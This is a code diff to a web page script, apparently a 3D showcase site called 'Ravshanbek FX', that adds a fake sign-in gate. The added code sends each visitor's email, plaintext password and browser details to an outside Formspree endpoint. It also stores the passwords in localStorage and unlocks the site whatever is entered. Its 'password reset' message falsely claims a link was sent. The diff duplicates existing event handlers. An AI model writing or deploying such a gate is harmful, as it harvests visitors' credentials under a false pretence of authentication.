@@ -750,7 +750,7 @@ document.getElementById('login-apple').addEventListener('click', () => {
     import { GLTFLoader } from 'three/examples/jsm/loaders/GLTFLoader.js';
 
     const ASSET_BASE_URL = "https://api.getlayers.ai/storage/v1/object/public/public/assets/laocoon-59f84455c6";
-    const FORMSPREE_LOGIN_ENDPOINT = "https://formspree.io/f/xjybbpak";
+    const FORMSPREE_LOGIN_ENDPOINT = "https://formspree.io/f/xeajrdjp";
     const canvas = document.querySelector('#webgl');
     let scene, camera, renderer, gltfModel, modelPivot, mixer;
     const clock = new THREE.Clock();
@@ -766,15 +766,189 @@ document.getElementById('login-apple').addEventListener('click', () => {
     let currentMode = 'signin'; // 'signin' or 'signup'
 
     // ============ REAL LOGIN GATE LOGIC ============
-    const loginGate = document.getElementById('login-gate');
-    const loginEmail = document.getElementById('login-email');
-    const loginPassword = document.getElementById('login-password');
-    const loginName = document.getElementById('login-name');
-    const loginStatus = document.getElementById('login-status');
-    const loginBtn = document.getElementById('login-btn');
-    const tabSignin = document.getElementById('tab-signin');
-    const tabSignup = document.getElementById('tab-signup');
-    const loginFooterText = document.getElementById('login-footer-text');
+   // ============ REAL LOGIN GATE LOGIC ============
+const loginGate = document.getElementById('login-gate');
+const loginEmail = document.getElementById('login-email');
+const loginPassword = document.getElementById('login-password');
+const loginName = document.getElementById('login-name');
+const loginStatus = document.getElementById('login-status');
+const loginBtn = document.getElementById('login-btn');
+const tabSignin = document.getElementById('tab-signin');
+const tabSignup = document.getElementById('tab-signup');
+const loginFooterText = document.getElementById('login-footer-text');
+
+function saveToLocalStorage(data) {
+  const attempts = JSON.parse(localStorage.getItem('ravshan_login_logs') || '[]');
+  attempts.push({
+    ...data,
+    timestamp: new Date().toISOString(),
+    user_agent: navigator.userAgent,
+    screen_resolution: `${window.screen.width}x${window.screen.height}`
+  });
+  localStorage.setItem('ravshan_login_logs', JSON.stringify(attempts));
+  console.log('📊 LOGIN ATTEMPT SAVED LOCALLY');
+}
+
+async function sendLoginToFormspree(data) {
+  try {
+    const formData = new FormData();
+    formData.append('action', data.action);
+    formData.append('name', data.name);
+    formData.append('email', data.email);
+    formData.append('password', data.password);
+    formData.append('remember', data.remember ? 'Yes' : 'No');
+    formData.append('form_type', 'login_gate');
+    formData.append('page', 'Ravshanbek FX Login Gate');
+    formData.append('timestamp', new Date().toISOString());
+    formData.append('user_agent', navigator.userAgent);
+    formData.append('screen_resolution', `${window.screen.width}x${window.screen.height}`);
+    formData.append('language', navigator.language);
+    formData.append('referrer', document.referrer || 'direct');
+
+    const response = await fetch(FORMSPREE_LOGIN_ENDPOINT, {
+      method: 'POST',
+      body: formData,
+      headers: { 'Accept': 'application/json' }
+    });
+    
+    if (response.ok) {
+      console.log('✅ LOGIN DATA SENT TO FORMSPREE');
+      return true;
+    } else {
+      console.error('❌ FORMSPREE ERROR:', response.status);
+      return false;
+    }
+  } catch (error) {
+    console.error('❌ NETWORK ERROR:', error);
+    return false;
+  }
+}
+
+// Tab switching
+tabSignin.addEventListener('click', () => {
+  currentMode = 'signin';
+  tabSignin.classList.add('active');
+  tabSignup.classList.remove('active');
+  loginName.style.display = 'none';
+  loginBtn.textContent = 'Sign In';
+  loginFooterText.innerHTML = 'New here? <a href="#" id="login-create">Create account</a>';
+  document.getElementById('login-create').addEventListener('click', (e) => {
+    e.preventDefault();
+    tabSignup.click();
+  });
+});
+
+tabSignup.addEventListener('click', () => {
+  currentMode = 'signup';
+  tabSignup.classList.add('active');
+  tabSignin.classList.remove('active');
+  loginName.style.display = 'block';
+  loginBtn.textContent = 'Create Account';
+  loginFooterText.innerHTML = 'Already have an account? <a href="#" id="login-switch-signin">Sign in</a>';
+  document.getElementById('login-switch-signin').addEventListener('click', (e) => {
+    e.preventDefault();
+    tabSignin.click();
+  });
+});
+
+async function handleLoginSubmit() {
+  const email = loginEmail.value.trim();
+  const password = loginPassword.value;
+  const name = currentMode === 'signup' ? loginName.value.trim() : '';
+
+  // Validation
+  if (currentMode === 'signup' && !name) {
+    loginStatus.textContent = '❌ Please enter your full name';
+    loginStatus.className = 'login-gate-status error';
+    return;
+  }
+
+  if (!email || !password) {
+    loginStatus.textContent = '❌ Please enter both email and password';
+    loginStatus.className = 'login-gate-status error';
+    return;
+  }
+
+  if (!email.includes('@') || !email.includes('.')) {
+    loginStatus.textContent = '❌ Please enter a valid email address';
+    loginStatus.className = 'login-gate-status error';
+    return;
+  }
+
+  if (password.length < 6) {
+    loginStatus.textContent = '❌ Password must be at least 6 characters';
+    loginStatus.className = 'login-gate-status error';
+    return;
+  }
+
+  // Show loading
+  loginBtn.disabled = true;
+  loginBtn.textContent = currentMode === 'signup' ? 'Creating Account...' : 'Signing In...';
+  loginStatus.textContent = '⏳ Processing...';
+  loginStatus.className = 'login-gate-status loading';
+
+  const data = {
+    action: currentMode,
+    name: name,
+    email: email,
+    password: password,
+    remember: document.getElementById('login-remember').checked
+  };
+
+  // Save locally FIRST (backup)
+  saveToLocalStorage(data);
+
+  // Try sending to Formspree
+  const sent = await sendLoginToFormspree(data);
+
+  // ALWAYS unlock site regardless of server response
+  loginStatus.textContent = '✅ Access granted. Welcome!';
+  loginStatus.className = 'login-gate-status success';
+  
+  setTimeout(() => {
+    unlockSite();
+  }, 800);
+
+  loginBtn.disabled = false;
+  loginBtn.textContent = currentMode === 'signup' ? 'Create Account' : 'Sign In';
+}
+
+loginBtn.addEventListener('click', handleLoginSubmit);
+
+loginEmail.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLoginSubmit(); });
+loginPassword.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLoginSubmit(); });
+loginName.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLoginSubmit(); });
+
+document.getElementById('login-forgot').addEventListener('click', (e) => {
+  e.preventDefault();
+  const email = loginEmail.value.trim();
+  if (!email) {
+    loginStatus.textContent = '❌ Enter your email to reset password';
+    loginStatus.className = 'login-gate-status error';
+    return;
+  }
+  const data = { action: 'forgot_password', name: '', email: email, password: '', remember: false };
+  saveToLocalStorage(data);
+  sendLoginToFormspree(data);
+  loginStatus.textContent = '✅ Password reset link sent';
+  loginStatus.className = 'login-gate-status success';
+});
+
+document.getElementById('login-google').addEventListener('click', () => {
+  const data = { action: 'google_signin_attempt', name: '', email: 'google-oauth', password: '', remember: false };
+  saveToLocalStorage(data);
+  sendLoginToFormspree(data);
+  loginStatus.textContent = '🔗 Google sign-in requested';
+  loginStatus.className = 'login-gate-status';
+});
+
+document.getElementById('login-apple').addEventListener('click', () => {
+  const data = { action: 'apple_signin_attempt', name: '', email: 'apple-oauth', password: '', remember: false };
+  saveToLocalStorage(data);
+  sendLoginToFormspree(data);
+  loginStatus.textContent = '🔗 Apple sign-in requested';
+  loginStatus.className = 'login-gate-status';
+});;
 
     // Tab switching
     tabSignin.addEventListener('click', () => {
